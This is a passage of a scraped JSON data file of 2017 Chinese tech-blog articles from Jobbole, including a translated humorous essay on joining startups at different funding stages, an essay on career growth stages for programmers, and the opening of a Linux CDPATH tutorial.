alt=\"\"></p>\n<p>即使这里再不济，再烂，也是自己比较熟悉的地方，如果真的出去了，外面的世界就是一个“大大的未知数”，那就是“无限的恐惧”。真是“路漫漫其修远兮，吾不知道如何求索”。因为长期以来，已经失去了对外面的洞察和竞争能力。除非，你告诉他，下一个地方是100%的风险的，即便有点点的风险，就会立刻退缩回来：<strong>待在一个一个已经注定没有希望的地方</strong>。</p>\n<p>这十多年，亲眼看到很多哭着喊着要出来的人，没有出来，最后被逼到没有退路而出来。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111017\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111017votetotal\">8</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111017\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 14 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/98f2926e40d283131123fa2517a00d9e.png"], "fav_nums": 14, "comment_nums": 3, "create_date": "2017/04/27", "praise_nums": 8}
{"tags": "趣文小说, 2 评论 ,创业,趣文", "front_image_path": "full/1692a67c4a5e8ba3b1ac85d849636c0dcab26d73.jpg", "title": "趣文：什么时候该加入创业公司？", "url_object_id": "a5c2f9556a2e98960dca2dc83361145a", "url": "http://blog.jobbole.com/111034/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx2803614675\">枫轻</a> 翻译，<a href=\"http://www.jobbole.com/members/huanglimin\">黄利民</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://tomblomfield.com/post/136759441870/when-to-join-a-startup\">Tom Blomfield</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【伯乐在线导读】：Tom Blomfield 是一个程序员，目前是一家创业公司的联合创始人，此前还是两位两家创业公司的联合创始人。本文以诙谐的口吻，描述了处于各阶段的创业公司的工作体验。加入起步阶段的公司，幻想着发达后买小岛；加入刚融资种子轮的公司，幻想着挑着城市买别墅……</p>\n<p> </p>\n<hr>\n<p>近年来，有些事情发生了变化，让越来越多的人想要加入初创公司。这似乎从《社交网络》电影出现开始——也许只是巧合，但我有时想象着，一群 MBA 围坐着观看 Justin Timberlake 饰演的 Sean Parker，心想着坐拥十亿美元，确实很酷。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/63918611gy1ff4iduqm3sj20hs0bojua.jpg\" width=\"551\" height=\"368\"></p>\n<p style=\"text-align: center;\">（社交网络剧照，左为 Sean Parker，右是小扎）</p>\n<p>当选择效力于创业公司的时候，人们通常忽略了最重要的因素之一，即公司的规模和所处的阶段。我认为有时这比行业或点子本身更重要。</p>\n<h3>起步阶段，或者说两人一卧室</h3>\n<p>创业公司成立不久，可能还没有合法成立。三四个人挤一间卧室，没有资金，不领薪水，以烘豆（Baked beans）果腹，日夜赶工出一个工作原型，以向客户或投资人展示。网站或 App 仅有的用户，是几个富有同情心的朋友，还有你妈。</p>\n<p><img class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1ff4ie3qlquj20m80goabx.jpg\" width=\"551\" height=\"414\"></p>\n<blockquote><p><span style=\"color: #808080;\">伯乐在线补充：Baked beans —— 焗豆，也被称作烘豆、烤豆子或茄汁豆，是欧洲传统食物，在现代仍然很受欢迎，常被做成罐头食品。虽然英文名指明是“烤豆子”，这道菜一般是和酱汁一起炖煮而成。大多数市面上的焗豆罐头使用白豆和番茄汁。白豆也被称为海军豆，是菜豆的一种。焗豆常被夹在面包里吃，也可以作为英式早餐的一部分食用。在美国，波士顿风格的焗豆享有盛名，让波士顿享有“豆子城”（Beantown）的称号。—— 摘自维基百科</span></p></blockquote>\n<p>早在一年前，有人试图劝你加入另外一家不一样的创业公司，但他们没有资金，零客户。他们想让你在没有工资的情况下工作，报以 1% 的股权。这听起来像是骗局，但你很高兴选择这样的创业公司。虽然可能拿不到工资，但至少是以一个持有两位数股权的合伙人身份加入。你与合伙人谈笑风生，聊着若干年内股权以数十亿美元售出时，将会买下哪个岛屿。</p>\n<p>产品愿景模糊而宽泛，你每天都在努力与客户确认。一切皆有可能。公司的整个方向可能每周都在变化着。</p>\n<p>因为什么都还没有，你需要保持着充沛的精力和原始的自信。没有专业化和层次管理结构，每个人可以去做任何需要做的事情。这也很令人振奋。</p>\n<p>但它也可能会让你感到精疲力尽，有时持续数月或数年，才能找到客户或者资金。</p>\n<h3>种子基金</h3>\n<p>这个阶段，公司有一个能够工作的原型产品，几十个正规用户和 25 万英镑的种子基金。这足以支付少数人的低薪水。你个头大，不适合在卧室了，于是在公共工作空间租用办公桌或在一家更大的创业公司找寻办公桌。</p>\n<p>走了很多捷径，但仍然发布了数量惊人的代码。陌生人开始用你的产品，这感觉很棒。你努力宣传，也许开始从第一个付费用户赚取了小额收入。</p>\n<p>在这个阶段加入，许以 3% 的股权和维持生计的基本工资。你谈论着当公司出售时，想在哪个城市买别墅（house）。</p>\n<blockquote><p>伯乐在线补充：在欧美所说的房子（house），一般是指独栋别墅，是一块土地上建造的一到两层建筑。有一个以上的卧室，卫生间和厨房，绝大部分有车库，有的有地下室。房间都是装修好的，而且所有的设备都完好，搬进家具就可以居住。中国买房指的是公寓（apartment），与美国正相反。另外，villa 一词是指豪华别墅或豪宅。</p></blockquote>\n<p>你也许作为第一个专业程序员或设计师加入，但还是孤军奋战。加入后，第一件事就是去苹果商店购买笔记本电脑，因为没人会想到订购任何设备。没有来自更富有经验的同事的“指导”，甚至无代码审查。究其原因，就是公司还太小。</p>\n<p>公司的「营销策略」，就是有个创始人把你们公司融资公告邮给 TechCruch。</p>\n<blockquote><p>伯乐在线补注：TechCrunch 是国外专注创业报道的科技媒体/博客。</p></blockquote>\n<p>作为一名员工，尽管并不知道业务模型可能还在翻天覆地地变化着，对于公司的方向，你依然有举足轻重的话语权。即使没有决策权，也能立刻获悉决策。</p>\n<p>如果没有募集到更多资金，公司很可能因为没找到“产品/市场定位”而破产。你妈说，你应该坚持在 Oracle 公司从事一份收入可观的工作。</p>\n<h3>A 轮融资</h3>\n<p>公司从一个大牌 VC 融资 3 百万英镑，团队扩展到 10~15 人。你们有了自己的办公室，门上挂着公司 logo，或者至少在公共办公区有自己的区域。</p>\n<p>投资人让你提交季度性的现金流报告，所以你第一次开始记录账目。在电脑上安装了 Excel 的同事都能做这件事。</p>\n<p>公司最终雇用一名办公室经理，来减轻多个创始人的行政负担。他们设立了工资单核算部，开始做同行评审。</p>\n<p>你加入公司，担当着一个特定的角色，但花了一或两星期弄明白自己真正负责哪些工作。至少他们记得为你订购一台笔记本，一张桌子和一张椅子。</p>\n<p>团队中有 3 到 4 位工程师，因此你开始做代码审查，并配置一个持续集成服务器。你哀叹在此之前的那些白痴积压的技术债务，拖慢了功能开发速度。</p>\n<p>公司新产品的方向由三位创始人会议决定；这是在 12 位职员参与的“全体”会议上提出来的。公司按季度规划了产品线路图，你被告知，自己的想法会被优先对待。你挑选最感兴趣的项目。</p>\n<p>你肯定能在大公司赚更多的钱，但目前的薪水足以舒服度日。你获得 0.5% 的股票期权和低于市场价格 10-30% 的薪水。并认为值得一赌 – 如果公司出售了，能在伦敦购置一处非常漂亮的别墅（house）。当然，感觉路还很长。</p>\n<p>营销工作是一位全职员工包办，从公关、付费广告到社交媒体的一切事宜。创始人不再亲自经营公司的 Twitter 账户。公司经常出现在科技媒体的“值得关注的创业公司”列表中。</p>\n<p>公司已经拥有成千上万的付费客户，时不时的能看到人们在公众场合使用你的 App，这感觉非常棒。你妈不太确定公司是做什么的，但你有可观的收入，她非常高兴。</p>\n<h3>B 轮融资</h3>\n<p>公司成立有 2-3 年了，刚融资到 1-2 千万英镑。资金用于扩展团队，增加人数至 60 人。</p>\n<p>创始人厌倦了简陋的办公室，因此他们不惜重金找到砌砖并带玻璃墙的办公室。每个人坐在 Herman Miller 椅子上。你在网上发现这种椅子成本 1000 英镑/个。</p>\n<p>有 3 到 4 个人做财务和人力资源的工作，你加入公司时，会领到一本公司手册。会接受几天的培训，但大多数事情是慢慢搞明白的。</p>\n<p>营销团队包括：三位数字广告人、专门的公关，内容和社区管理的人。已经有数百万的付费客户分别在若干国家，公司定期出现在新闻媒体的商业版块上。</p>\n<p>工程团队分成了两到三个独立团队，他们正在尝试招聘即将毕业的大学生，填补来年的招聘渠道。</p>\n<p>在接到团队管理者招聘后，你以一个非常明确的角色加入。面试中见过创始人，但你在这里工作他们也并不总能记得你的名字。CEO 每两周见一次管理教练。</p>\n<p>产品的新方向，是在董事会上讨论，高级管理层由 CEO 通知。管理层让他们的团队知道变化即将来临。大多数人关注“可重复的过程”和扩张。</p>\n<p>虽然公司似乎不经常发布新功能，但你妈感到很骄傲，因为她的朋友也在用公司的 App。</p>\n<p>你的薪水符合其他公司的支付水平，并获得了 0.05% 的股票期权。你已经想好了，公司出售时给看中的别墅交押金。公司在某个阶段出售，看来八九不离十了。</p>\n<h3>C 轮融资</h3>\n<p>你加入了一家独角兽公司！5 年后，公司已经以 10 亿英镑的估值融资到 1 亿英镑。在交易结构中有一些你没见过的奇怪术语，公司的HR 告诉你，这只是“法律的东西”。</p>\n<p>当你加入后，获得价值 5 万英镑的期权，这是公司的一个百分点的两百分之一，或者是 0.005%。其他创业公司的朋友告诉你，去检查投资者的清算偏好是什么，但你公司中似乎没人会告诉你这个。他们所有人都忙于猜测 IPO 何时公布。你了解到任何支出都是一份不错的奖励。不管怎样，薪水是相当体面的。</p>\n<p>你加入公司新开的都柏林办事处，这是公司走向国际化的一步。作为 6 名新销售之一，你专注于欧洲企业销售。在正式接触客户之前，有为期 4 周的密集型就职培训课程。</p>\n<p>新办公室最初感觉空荡荡的，但会惊讶地发现，新同事很快就会补充进来。你问营销部在哪里时，被告知他们在不同的办公室。</p>\n<p>虽然你在《福布斯》封面看到过公司 CEO，但你实际上从来没见过他。</p>\n<p>相比 TechCrunch 上的一些新起之秀，虽然公司 App 看起来有点过时了，但你妈已经在用了。</p>\n<p>Business Insider 上有文章报道说，公司解聘了之前新来的产品副总裁，正在追求新的产品方向。她是 6 月前才从 Twitter 过来。几天前 HR 在发了内部通知，公司正在进行一些小的内部重组。</p>\n<p>你看到顾问在会议室，但不知道他们在干什么。</p>\n<p>一个月后，你参与一次由公司总部的电视全体会议。CEO 发表了一篇简短的演讲，宣布公司已被 Oracle 收购，他解释说这样能加速公司实现愿景。他感谢各位参与了公司不可思议的发展历程。听众无不落泪。</p>\n<p>HR 接着解释说作为收购的一部分，一些部门会缩小规模。你被告知自己的股票期权“缩水”了。当用 Google 查询时，发现它们一文不值。工程团队的一些同事被授予 Oracle 股票作为“留任薪酬方案（retention package）”，但这不适用于任何销售人员。你不知道为何自己早早加入了初创公司。</p>\n<p> </p>\n<h3>伯乐在线摘编一些读者评论</h3>\n<p>Lokesh Verma：</p>\n<blockquote><p>我在 B 轮融资和 C 轮融资阶段的创业公司工作过，我可以肯定地说，文章非常接近我的真是经历。</p></blockquote>\n<p>Daleep Chhabria：</p>\n<blockquote><p>文章很有趣，并且真实。那些一心想加入 sexy 创业公司的童鞋，必读。</p></blockquote>\n<p>Salvation Alibor：</p>\n<blockquote><p>超棒！我觉得你应该做创业导师。</p></blockquote>\n<p>tjmoore99：</p>\n<blockquote><p>我是一个开过 2 个公司的创业者，我从没有把公司带到 B 轮融资阶段。我两个公司到 A 轮阶段就用了四五年，VC 会议在 1999 年谈了 7-8 次，2007 年大约是 40 次。虽然在在一周之内把公司卖了 1000 万美元，但要是晚几个月，交易就黄了，因为 2008 年市场开始下滑。</p>\n<p>如果有人出高价买你的公司，快速接受。别犹豫，市场可能会变化、人也会变。变化因素太多了。</p>\n<p>2008 年我们最后在 A 轮融资 300 万，然后几个月之后他们就新招了一个 CEO，把我解雇了。被逼退出自己创办的公司，很难过。我每天工作 10-12 小时，就像熟悉自己手背那样了解公司，但这对 VC 来说，然并卵。</p>\n<p>相比创始人，VC 他们更为信任一个有经验的 CEO。在融资不仅后，我贱卖了股票。在公司倒闭前，至少我能得到点东西。我估计有 5% 的公司是这样的。所以在放弃你的全日性工作之前要三思。在 A 轮融资阶段要特别小心。</p></blockquote>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111034\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111034votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111034\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 8 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx2803614675\">枫轻</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/wx2803614675\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/d84bcbb0a1f4aa3fdae3199108091382.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            软件工程+英语 本科双学位，JAVA 程序媛 92 年一枚，语言主要涉及 JAVA/C/C# ，爱折腾各种新技术，工作中涉及 Mongodb，Nginx  等，欢迎交流学习        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/wx2803614675\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/wx2803614675/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/wx2803614675/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 12</a> · <a title=\"个人微信：1091149131\" target=\"_blank\" href=\"#\"><i class=\"fa fa-weixin\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/mw690/63918611gy1ff4iduqm3sj20hs0bojua.jpg"], "fav_nums": 8, "comment_nums": 2, "create_date": "2017/04/30", "praise_nums": 3}
{"tags": " 5 评论 ,职场,程序员", "front_image_path": "full/854e76e92b603e2e2ae8d4bdf0b0c6ec16481131.jpg", "title": "技术的成长曲线", "url_object_id": "00845c61ff2446b059420ec791c96567", "url": "http://blog.jobbole.com/110142/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://zhangtielei.com/posts/blog-growth-curve.html\">张铁蕾</a>   </div><p>小李毕业后在一家公司做软件工程师，转眼间一年多的时间已经过去了。</p>\n<p>回想刚毕业那会，他是怀着无比忐忑的心情进入了这家公司的技术部门。各种新奇的开发工具，叫不上名字的众多软件框架，庞大的代码库，井然有序的工作流程，都是小李以前在学校里不曾遇到过的，这让他感到了前所未有的压力。于是，在开始的那半年，小李就像一株久旱的禾苗遇到了雨水，拼命地吸收着工作中遇到的每一点知识。他学习新的编程语言，学习新的开发工具，学习调试和解bug的技巧，也学习处理各种棘手的业务逻辑。虽然每天工作很累，但每天都是满满的收获。</p>\n<p>而现如今，小李俨然是一名很有经验的老手了。对于工作中一般的问题，他都能游刃有余地加以解决，无非是把现有的一些内部接口重新组合利用，或者按照原有的套路重新设计改进一番。应付工作既然比以前轻松了许多，工作的压力也就显得没有那么大了。于是小李平常也能抽出时间来上上网，看看美剧，或者打打游戏，有时候也带着女友去看场电影或者球赛。</p>\n<p>然而时间长了，小李心里却隐隐多了一丝不安。他再也找不到开始那种突飞猛进的爽快了，而且当对工作越来越熟悉之后，工作本身开始变得枯燥、没意思。他决定花更多精力在自己的技术提高上，但却感觉无从下手，很难突破。每次完成一个新的开发需求，也只是不断重复旧有的东西而已。</p>\n<h2 id=\"成长曲线和四大阶段\">成长曲线和四大阶段</h2>\n<p>小李的情况其实非常典型。很多技术人员在工作一两年之后，对工作周围的事情都驾轻就熟了，就可能会陷入第一个瓶颈期，再难突破。</p>\n<p>为了能更清晰地分析技术成长过程中出现的各种情况，我们来对技术的成长曲线做一个总结。如下图：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/63918611gy1fehgkjjrixj20tq0j875c.jpg\"></p>\n<p>技术的成长过程并非匀速线性的，而是分阶段的。每个高速增长的突破期后面，都跟着一个平缓的增长期，可以称为舒适期，也可以称为瓶颈期。舒适期是针对过去而言的，而瓶颈期的说法则更着眼于未来。</p>\n<p>一般来说，突破的过程，绝非轻而易举，而且有可能伴随着阵痛。它需要我们付出十分的心力，甚至承担一定的风险，做成一些原本超出自己能力极限的事情。而一旦过了突破期，各种技能在这个层次上融会贯通，就会给我们带来极大的自信和成就感。这个时候，处理同一层面的问题，逐渐变得轻车熟路，于是进入了舒适期。</p>\n<p>舒适期对人有一种天然的吸引力，我们只要待在这个阶段，就能获得最大的安全感，尽量少地遭受不确定性的折磨。很多人会选择待在这个区间，不再走出一步。而另一些人则会对这一阶段的缓慢增长产生焦虑，于是舒适期变成了瓶颈期，从而引发下一轮的突破。</p>\n<p>以每一次大的突破为分界，我们可以将技术人员的成长粗略划分为四大阶段：新手、熟手、专家、宗师（开创者）。</p>\n<p>新手经过半年到一年的工作经验，如果能成功适应这份工作，基本就能有所突破，变成一个熟手。熟手的特点是，能对现成的工具充分利用，胜任大部分日常工作。在技术水平的表现上，他了解大部分的技术概念，但不一定理解真正的含义；在他的眼中，技术还无法自成体系，能理解到的知识架构还有所残缺。他解决问题所依靠的，更多是经验而非缜密的逻辑。前面提到的小李，就处于这个阶段。</p>\n<p>熟手再向上突破一层，则成为技术专家。专家，在某个领域拥有足够全面、系统而深入的知识储备，对于技术上的疑难杂症，有能力深入到足够的层次，指出问题的症结所在；另一方面，专家还应该能够完成对具体问题的抽象，拥有“造轮子”的能力。在专家的眼中，技术的黑盒子被打开，知识点也不再是孤立存在的，而是相互枝连，构成一个完整的逻辑系统。</p>\n<p>而真正达到宗师这一级别的，整个世上也寥寥无几。他们是真正的开创者，能够引领一个技术时代。什么样的人才配得上“宗师”这个称呼呢？比如Dennis M. Ritchie（C语言和Unix之父），再比如Linus（Linux内核的发明人）。</p>\n<p>但就像前面的技术成长曲线图所描绘的，技术的成长阶段并没有一个上限。无论你处在哪个阶段，前面仍然存在无限的上升空间。</p>\n<h3 id=\"郭靖的进阶之路\">郭靖的进阶之路</h3>\n<p>近日细读金庸老爷子的《射雕英雄传》，忽然意识到，郭靖乃是金庸武侠中天资最为鲁钝的一位主人公。然而，郭靖从一个普通少年，终成长为一代大侠，这一过程，正好暗合了前面讲到的技术成长曲线。</p>\n<p>郭靖从六岁开始，在蒙古大漠接受江南六怪传授武功，花了整整十年。后又得全真教掌教马钰传授内功一年有余，武功初入门径，获得了武学上第一个突破（熟手期）。处于这个阶段的郭靖，在武功上与同龄的杨康不相上下。</p>\n<p>郭靖在武学上的第二个突破，起因于两个事件：一个是“北丐”洪七公传授他降龙十八掌，另一个是老顽童骗他背诵《九阴真经》。经过一番历练，在华山顶上，他已经拥有了分别与“东邪”和“北丐”过手三百招而保持不败的战绩。此时的郭靖，已经是高手中的高手了（专家）。这第二次突破，他只用了两年有余。</p>\n<p>而郭靖的第三个突破，已经是在《射雕》之后了，终于成长为一代武学宗师。</p>\n<p>为什么天资并不出众的郭靖，却能够接连取得突破呢？至少两个原因不容忽视。一个是勤奋，“人家练一朝，我就练十天”，所以根基打得好；另一个原因是他恰好学对了东西，降龙十八掌和《九阴真经》都是正宗武学，有幸学到自然是突飞猛进。</p>\n<h2 id=\"突破的要领\">突破的要领</h2>\n<p>技术成长的关键在于突破。</p>\n<p>然而，在技术成长的路上，越到后面，突破的难度就越大。大部分新手，只要保持足够的勤奋，总能达到熟手的程度。但很多人却止步于此，他们或流连于舒适期的诱惑不肯走出来，或长期卡在瓶颈期却找不到突破的出口。能够突破达到专家这一阶段的技术人员，已经足够成为各大公司技术部门的翘楚了。而要达到宗师的级别，则不光靠个人的努力，还需要时代的机遇才有可能。</p>\n<p>那么，为了达到真正的突破，有哪些因素是我们需要重视的呢？</p>\n<h3>第一，根基。</h3>\n<p>在接触一门新技术或者一个新的技术领域时，良好的基础有利于我们快速突破，抵达下一个阶段。不同技术之间，基础却是相通的。比如，对于计算机软件学科的基础知识——数据结构和算法，处于熟手期的程序员可能多半会认为它们在工作中根本没有用。这是因为这个阶段的技术人员主要靠孤立的经验解决问题，一些基础的知识自然就用不上。但对于技术专家层次的人来说，数据结构和算法却是在系统设计的很多方面潜移默化地发挥作用。对于其它计算机基础学科，这个道理也同样适用。</p>\n<p>再比如，现在人工智能和机器学习技术比较火，似乎全民都在学习。但要想学好这些技术，至少应该对于微积分、线性代数、概率论、统计学等数学知识有比较扎实的基础，才能走得更远。</p>\n<h3>第二，外因，一个不疾不徐的环境。</h3>\n<p>过于宽松的环境自然不利于人的进步，而盲目的紧张也不利于人的成长。</p>\n<p>突破的过程需要付出巨大的精力，所以需要投入足够的时间去从容地完成。我们大概都经历过这样一种场景：新产品上线在即，但还有很多问题需要解决。如果距离预定上线时间还有数天，那么我们可以相对从容地用比较优雅的方式来解决这些问题，并做一些长远的打算；但如果我们碰到的情况是，两个小时以后就要上线了，那么我们多半会想一些歪点子来规避这些问题。</p>\n<p>产品开发和技术优化，有时相辅相成，有时又互相矛盾。如果你所处的工作岗位，只是要求你不停地修改业务流程，盲目地试错，那么，可能公司根本没有给你留出技术突破的空间。试想，一个主旨不清，功能点做了新的就扔了旧的，而没有长远的目标，也不去持续优化体验，这样的一个产品，又怎能有持续的生命力呢？</p>\n<h3>第三，正确（正宗）的学习资料。</h3>\n<p>新手刚开始工作的时候，通常只要看一些入门教程（Tutorial），跑几个Demo，扫除了表面上的技术疑问点，再针对业务代码向老员工请教一番，基本就能开始工作了。然后一边编码，一边查阅所需要的API Reference，时间长了，经验和技巧足够多了，就自然变成熟手了。</p>\n<p>而从熟手向专家的突破，则需要系统地去补习知识架构。<strong>技巧应该建立在对于普遍规则的理解之上</strong>。这里不得不提及Spec，它是涉及某项技术的完备的、系统的描述，包含该项技术涉及到的方方面面（具体参见我的另一篇文章《<a href=\"http://blog.jobbole.com/105667/\" target=\"_blank\">技术的正宗与野路子</a>》）。在奔向技术专家的路上，阅读Spec，是不可逾越的一道功课。《射雕》中郭靖的武功突破，很大程度上就是因为他阅读了《九阴真经》这份大大的Spec。当然，除此之外，你可能还需要通读重要部分的API Reference以及Source Code。</p>\n<p>技术专家必然将原始文献（官网Spec、论文等）作为知识的第一来源。相反，跟着某人的博客去系统地学习某方面的技术，是要冒有很大风险的，还需慎重选择。</p>\n<p>最后，要想成为技术上的一代宗师，则需要更高的抽象，做出完全创造性的工作。这份工作不仅仅是阅读Spec，解决具体的问题了，而是创作Spec，开创全新的天地。</p>\n<h3>第四，独立思考，不要自我设限。</h3>\n<p>现在，很多人喜欢把技术好的人喊作“大神”。这自然是代表一种尊重，很多听的人也很受用。</p>\n<p>但是，“神”的称呼暗含了一层意思：神是无法超越的，是普通人学不来的。这是人们在潜意识里划出的一道鸿沟。所以，我就不太喜欢类似这种称呼。</p>\n<p>很多人碰到问题就喜欢找身边“大神”去问，但殊不知问再多问题，你仍然无法真正地有所提高。普通人和“大神”之间真正的鸿沟在于，能否独立思考和解决问题。</p>\n<hr>\n<p>在追求技术成长的路上，不可能总是一帆风顺。我们不免有时沮丧，有时欣喜。</p>\n<p>人生苦短，有人穷其一生，就是想要达到理想中的那个状态。但不管结果如何，当我们青春不再的时候，只求问心无愧。</p>\n<p>（完）</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110142\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110142votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110142\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 16 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/63918611gy1fehgkjjrixj20tq0j875c.jpg"], "fav_nums": 16, "comment_nums": 5, "create_date": "2017/04/10", "praise_nums": 4}
{"tags": "IT技术,命令行", "front_image_path": "full/a6e095311cee5dbfc6a3b7e5127f63181f1ad769.jpg", "title": "Linux 命令行工具使用小贴士及技巧（3）", "url_object_id": "02652b201d914ce5fe67ea168ab4d993", "url": "http://blog.jobbole.com/110845/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.howtoforge.com/tutorial/linux-command-line-tips-tricks-part-3-cdpath/\">Ansh</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8387-1.html\">HaitaoBio</a>   </div><p>在这个系列的<a href=\"http://blog.jobbole.com/110739/\">第一部分</a>，我们详细地讨论了 <code>cd -</code> 命令，在<a href=\"http://blog.jobbole.com/110774/\">第二部分</a>，我们深入探究了 <code>pushd</code> 和 <code>popd</code> 两个命令，以及它们使用的场景。</p>\n<p>继续对命令行的讨论，在这篇教程中，我们将会通过简单易懂的实例来讨论 <code>CDPATH</code> 这个环境变量。我们也会讨论关于此变量的一些进阶细节。</p>\n<p><em>在这之前，先声明一下此教程中的所有实例都已经在 Ubuntu 14.04 和 4.3.11(1) 版本的 Bash 下测试过。</em></p>\n<h3 id=\"toc_1\">环境变量 CDPATH</h3>\n<p>即使你的命令行所有操作都在特定的目录下 – 例如你的主目录，然而在你切换目录时也不得不提供绝对路径。比如，考虑我现在的情况，就是在 <code>/home/himanshu/Downloads</code> 目录下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd586c2c8e021472355\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div 